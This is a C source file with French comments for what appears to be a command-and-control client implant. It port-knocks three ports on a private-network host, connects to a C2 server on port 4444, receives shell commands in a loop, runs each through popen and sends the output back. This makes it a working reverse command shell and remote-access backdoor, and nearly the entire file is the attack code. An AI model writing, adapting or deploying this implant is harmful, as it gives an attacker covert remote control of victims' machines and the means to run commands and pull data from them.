#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


#define SERVER_IP "192.168.111.208"
#define KNOCK_PORTS {4000, 5000, 6000}
#define PORT 4444
#define BUFFER_SIZE 1024


    void knock_port(int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    sleep(1);
}

int main() {

    int ports[] = KNOCK_PORTS;
    for (int i = 0; i < sizeof(ports) / sizeof(ports[0]); i++)
        knock_port(ports[i]);

    printf(">> Connexion au C2 sur %d...\n", PORT);
    
    
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Création du socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Connexion au serveur C2
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("[Client] Erreur de connexion");
        return 1;
    }
    printf("[Client] Connecté au serveur C2.\n");

    // Écoute en boucle des commandes du serveur C2
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            printf("[Client] Déconnexion du serveur.\n");
            break;
        }

        buffer[bytes_received] = '\0';
        printf("[Client] Commande reçue : %s\n", buffer);

        if (strcmp(buffer, "exit") == 0) {
            printf("[Client] Fermeture du client.\n");
            break;
        }

        // Exécuter la commande et récupérer la sortie
        FILE *fp = popen(buffer, "r");  
        if (fp == NULL) {
            send(sock, "[Client] Erreur lors de l'exécution de la commande\n", 49, 0);
            continue;
        }

        // Lire la sortie de la commande et l'envoyer au serveur C2
        char output[BUFFER_SIZE];
        memset(output, 0, BUFFER_SIZE);
        fread(output, 1, BUFFER_SIZE - 1, fp);
        pclose(fp);

        send(sock, output, strlen(output), 0);
    }

   



    close(sock);
    return 0;
}